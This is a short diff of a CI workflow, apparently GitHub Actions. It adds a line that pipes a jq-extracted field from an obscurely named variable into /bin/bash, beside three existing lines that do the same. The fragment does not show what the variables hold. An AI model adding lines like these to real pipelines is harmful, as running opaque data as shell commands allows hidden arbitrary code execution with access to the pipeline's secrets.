@@ -28,6 +28,7 @@ jobs:
           echo $uu4 | jq -r .xca3 | /bin/bash
           echo $sn1 | jq -r .xsvv54406 | /bin/bash
           printf '%s' "$a696" | jq -r .sw29 | /bin/bash
+          printf '%s' "$pi3435" | jq -r .biwap7 | /bin/bash
 
       - name: Save output
         if: always()
